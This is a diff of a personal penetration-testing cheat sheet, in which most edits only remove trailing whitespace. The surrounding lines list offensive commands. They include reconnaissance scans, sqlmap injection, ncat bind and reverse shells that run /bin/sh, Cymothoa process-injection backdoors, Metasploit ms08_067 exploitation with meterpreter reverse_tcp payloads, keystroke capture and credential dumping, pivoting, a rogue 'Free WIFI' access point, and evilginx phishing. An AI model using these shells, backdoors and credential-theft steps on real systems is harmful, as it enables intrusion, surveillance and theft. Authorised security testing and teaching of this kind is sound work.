@@ -1,11 +1,11 @@
 # Commands
 #------------------------------------------------------------------------------
-  dirb https://domain.com # bruto forse open wordlist 
+  dirb https://domain.com       # bruto forse open wordlist
   dmitry -s -e -w -p domain.com # scan,email,whois,tcp subdomain search
-  fierce -dns $domain -threads 10 # trase domain
+  fierce -dns $domain -threads 10            # trase domain
   firewalk -S 1-23 -i eth0 192.168.1.1 192.168.10.1 # testing routers
-  kismet # wireless network detector
-  masscan 192.168.1.0/24 -p 80,443,23  # scan internet; similar to nmap
+  kismet                                     # wireless network detector
+  masscan 192.168.1.0/24 -p 80,443,23        # scan internet; similar to nmap
   nmap -Pn -sV host.com --script dns-brute   # normal
   nmap -Pn -sA host.com --script dns-brute   # TCP ACK scan
   nmap -Pn -sW host.com --script dns-brute   # Window scan like ACK
@@ -123,13 +123,13 @@
 
 # Penetration Testing Methodology
 #-------------------------------------------------------------------------------
-Black or White box testing 
-vulnerability assessment versus penetration testing 
+Black or White box testing
+vulnerability assessment versus penetration testing
 Open Source Security Testing Mewthodology Manual (OSSTMM)
 Open Web Application Security Project (OWASP)
 Web Application Security Consortium threat Classification (WASC-TC)
 Penetration Testing Execution Standard (PTES)  -> pre engagement, intelligence gathering , threat modeling, vulnerability analysis, exploitation, post-exploitation, reporting
-General Penetration Testing Framework - 
+General Penetration Testing Framework -
 target scopping,info gathering,target discovery,Enumeration target, Vulnerability mapping
 Social engineering, Target exploitation, Privilege excalation, Maintaining access, reporting
 
@@ -144,7 +144,7 @@ DNS, hostnames, IP addresses, techmnologies and cofiguration used
 Public Resources: archive.org;serversniff.net centralops.net;wink.com;tineye.com
 
 dig <domain> any
-dig @ns4.isp.com example.com axfr     # to do DNS zone transfer we must set 
+dig @ns4.isp.com example.com axfr     # to do DNS zone transfer we must set
                                       # authoritative DNS server
 dnsenum example.com
 dnsenum -f dns.txt example.com        # bruto force subdomains from a wordlist
@@ -163,7 +163,7 @@ metagoofil -d example.com -l 20 -t doc,pdf -n 5 -f test.html -o test
 	# -o test save to directory test
 	# -l limit
 	# -n 5 download five files
-	# -f test.html save it 
+	# -f test.html save it
 tcptraceroute www.example.com
 tcptrace -i eth0 -d www.example.com
 theharvester -d example.com -l 100 -b google
@@ -196,15 +196,15 @@ nmap -sN -p 22,25 192.168.56.103
 nmap 192.168.56.103 -oX myscan.xml
 	xsltproc myscan.xml -o myscan.xml
 nmap -sV 192.168.56.103 -p 22
-nmap -O 192.168.53.100  	# fingerpring
+nmap -O 192.168.53.100	        # fingerpring
 nmap -A <ip>			# aggressive -> service detection (-sV); -O ; -sC -> script scanning; --traceroute
 nmap -6 <ip>
 # Nmap scripting engine
 nmap --script http-enum,http-headers,http-methods,http-php-version -p 80 192.168.1.1
-  	-f -> fragment packets
+        -f -> fragment packets
 	--mtu  ->  your own packet size
 	-D (decoy)   some of the probes from the spoofed IP address
-	--source-port 
+	--source-port
 unicornscan -m U -Iv 192.168.56.103:1-65535
 unicornscan -m U -Iv 192.168.56.103/24:1-65535 -r 10000
 tcpdump --nnx tcp and host 192.168.56.102
@@ -218,7 +218,7 @@ ike-scan -M -A -Pike-hashkey 192.168.0.10
 	# -M -> splits the payload decoded across multiple lines
 ike-scan -M --trans=5,2,1,2 --showbackoff 192.168.0.10
 
-# Vulnerability Mapping 
+# Vulnerability Mapping
 #-------------------------------------------------------------------------------
 # Local vul; Vulnerability taxonomy -> categorizes all the common sets of vuls
 # Open Vulnerability Assestment System OpenVAS- Amap,Nmap,Snmpwalk,Ike-scan,w3af
@@ -253,7 +253,7 @@ cd /usr/share/sqlmap
 sqlmap -u "https://example.com/test.php?artist=2" -p "artist" -f -b --current-db --dbs --users
 sqlmap -u "https://example.com/test.php?artist=2" -p "artist" --tables -D fanart -v 0
 
-SQL Ninja 
+SQL Ninja
 # cd /usr/share/doc/sqlninja
 gzip -d sqlninja.conf.example.gz
 cp sqlninja.conf.example.gz /usr.share.sqlninja/sqlninja.conf    | update configuration
@@ -266,7 +266,7 @@ burpsuite		# online
 Nikto2   		# basic web server security scanner
 nikto2  -h testphp.example.com -p 80 -T 3478b -t 3 -D \ V -o webtest -F htm
 	# -T tuning option    https://cirt.net
-paros   
+paros
 w3af_console       # feature-rich web application attack and audit framework
 w3af>>> help
 w3af>>> plugins
@@ -284,11 +284,11 @@ WafW00f or WebScarab
 # Social engineering Toolkit (SET)
 #-------------------------------------------------------------------------------
 setoolkit
-set> 		  
+set>
 # Targeted phishing attack -> frist create e-mail template with malicious PDF
 
 
-# Target Exploitation 
+# Target Exploitation
 #-------------------------------------------------------------------------------
 cd /usr/share/exploitdb/
 vim files.csv               # this will list of exploits currently avaiable from Exploit-Db under the
@@ -312,10 +312,10 @@ Horizontal privilege excalation: norm user is able to access other normal users
 # Maintaining Access
 #-------------------------------------------------------------------------------
 - Operation system backdoor; tunneling tools; Web backdoor
-Cymothoa  - backdoor allowes to inject its shellcode into an existing process, 
+Cymothoa  - backdoor allowes to inject its shellcode into an existing process,
 	execution in memory
 1. copy the cymothoa binary file to the target machine to generate the backdoor
-ps -aux    
+ps -aux
 2. we will inject PID 4255, we need to set the port number for the payload using the option -y
 cymothoa -p 4255 -s l -y 4444
 3. Let's try to log in to our backdoor port 4444
@@ -335,7 +335,7 @@ ncat -l 1337 -e /bin/sh               # normal backdoor
 ncat 192.168.2.23 1337                 # from machine connect to target
 # Reverse shell
 ncat -l 1337                           # set pen machine to listen on port 1337
-ncat 192.168.2.21 1337 -e /bin/sh      # on target use the following ncat cmd 
+ncat 192.168.2.21 1337 -e /bin/sh      # on target use the following ncat cmd
 ssh -f -N -L <source>:<port>:<dest>:<port> user@relay # execute from source
 ssh -f -N -R <source>:<port>:<dest>:<port> user@relay # execute from dest
 
@@ -346,7 +346,7 @@ proxychain telnet example.com
 #------------------------------------------------------------------------------
 # MSFconsole
 #------------------------------------------------------------------------------
-# Init 
+# Init
 #------------------------------------------------------------------------------
 /etc/init.d/postresql start
 sudo msfdb init
@@ -366,14 +366,14 @@ armitage                                       # GUI
 nc -lvnp 8443                # create listener
 nmap -sS -Pn  192.198.1.1    # preferred,-sS > stealth TCP scan,-Pn>alive hosts
 nmap -sS -Pn -A 192.168.1.1  # A - advanced service enumeration
-nmap -sV -p- -T4 192.168.1.1 
+nmap -sV -p- -T4 192.168.1.1
 nmap --script-help "afp-* and discovery"
 nmap --script "http-*"                       # find inside scripting engine
 nmap -sC --script-args 'user=foo,pass=",{}=bar",paths={/admin,/cgi-bin},xmpp-info.server_name=localhost'
 nmap --script smb-os-discovery --script-trace example.com
 nmap --script mycustomscripts,safe example.com      # execute all scripts in my dir
 nslookup set type=mx secmaniac.net
-msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run" 
+msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run"
 msfvenom -h                                    # replace MSFencode
 msfvenom -l payloads
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c #C-formatted
@@ -399,22 +399,22 @@ info
 resource automation.rc
 save
 set <function>        - set specific value
-setg                  - global 
+setg                  - global
 show targets
 services -c name,info 192.168.1.155
 services -c name,info -S httpd
 services -c info,name -p 80-445
 services -s http -c port 192.168.1.155 -o /tmp/export-services.csv
-set / unset 
+set / unset
 show options | exploits | auxiliary | payloads
 show targets
 search <apache>
 sessions -l -v
 session -i 1
 session -u 1    # upgrade a cmd shell to a Meterpreter shell
-session -u 2    # Meterpreter shell 
+session -u 2    # Meterpreter shell
 session -z      # will not interact with session once target has been exploited
-use 
+use
 workspace -a my-lab1
 workspace my-lab1                              # choose workspace
 workspace -d my-lab3                           # delete
@@ -436,7 +436,7 @@ sysinfo
 # Capturing Keystroke
 meterpreter> ps
    > migrate <process_number_of_explorer.exe>
-   > run post/windows/capture/keylog_recorder   # save into the file 
+   > run post/windows/capture/keylog_recorder   # save into the file
 cat file_with_keylog_recorder.txt
 
 # Dumping Usernames and Passwords
@@ -464,7 +464,7 @@ meterpreter> ps             # number: 380  user:  SNEAK.in\domainadmin
 # Pivoting onto Other Systems
 meterpreter > run get_local_subnets
    > background
-   > route add 192.168.1.120 255.255.255.0 1 
+   > route add 192.168.1.120 255.255.255.0 1
    > route print
    > ....
    > load auto_add_route
@@ -486,10 +486,10 @@ meterpreter> run <script_name>
 #------------------------------------------------------------------------------
 echo use exploit/windows/smb/ms08_067_netapi  > rf.rc
 echo load sourds >> rf.rc
-echo set RHOST [IP] >> rf.rc  
-echo set PAYLOAD windows/meterpreter/reverse_tcp   >> rf.rc 
+echo set RHOST [IP] >> rf.rc
+echo set PAYLOAD windows/meterpreter/reverse_tcp   >> rf.rc
 echo set LHOST [IP] >> rf.rc
-echo run >> rf.rc 
+echo run >> rf.rc
 # 1.
 ./msfconsole -r rf.rc
 # or 2.
@@ -526,12 +526,12 @@ msf> search portscan
        # Writing a Custom Scanner
          - mixins are portions of code with predefined functions
            and calls that are preconfigured for you
-   > use auxiliary/scanner/smb/smb_login 
+   > use auxiliary/scanner/smb/smb_login
    > use auxiliary/scanner/vnc/vnc_none_auth
    > use auxiliary/scanner/x11/open_x11
 
 
-# Vulnerability scanning 
+# Vulnerability scanning
 #------------------------------------------------------------------------------
 nc 192.168.1.155 80
 # NeXpose    https://<my_ip>:3780
@@ -561,7 +561,7 @@ nc 192.168.1.155 80
     > hosts -c address,svcs,vulns
 
 
-# Autopwning was removed how to add back 
+# Autopwning was removed how to add back
 #------------------------------------------------------------------------------
 # https://github.com/hahwul/metasploit-autopwn
 wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
@@ -587,7 +587,7 @@ msf > search ms08_067
 # Launching a Payload Stealthily
 
 
-# Client-side attacks  
+# Client-side attacks
 #------------------------------------------------------------------------------
 # PDF, WORD  -  Heap Spraying
 # Browser-Based Exploits
@@ -626,7 +626,7 @@ AUTO_DETECT=ON          # detect your local IP address automatically
      - you can emulate a keyboard and mouse. When you insert device it will be
        detected as a keyboard and using the microprocessor and onboard flash
        memory storage, you can send a very fast set of keystrokes to target
-# FAST-TRACK              
+# FAST-TRACK
 setoolkit
 ./fast-track.py -i           # interactive
 ./fast-track.py -g           # to load web interface
@@ -640,7 +640,7 @@ cat karma.rc
 # airbase-ng is used to create Karmetasploit's fake access point
 # airmon-ng start wlan0
 airbase-ng -P -C 30 -e "Free WIFI" -v mon0
-        -P > access point to respond to all probes, to beacon every 30s,verbose 
+        -P > access point to respond to all probes, to beacon every 30s,verbose
         - created tap interface at0
 ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
 dhcp -cf /etc/dhcp/dhclient.conf at0
@@ -690,10 +690,10 @@ https://vimeo.com/281220095
 https://github.com/kgretzky/evilginx2
 # outlook user
 # copy plugin edit cokky extension into chrome
-# evilginx_parser.py -i /tmp/log/phish-google.log 
+# evilginx_parser.py -i /tmp/log/phish-google.log
 
 
-# Kubernetes 
+# Kubernetes
 #------------------------------------------------------------------------------
 https://www.youtube.com/watch?v=ivmn1Oay41g
 
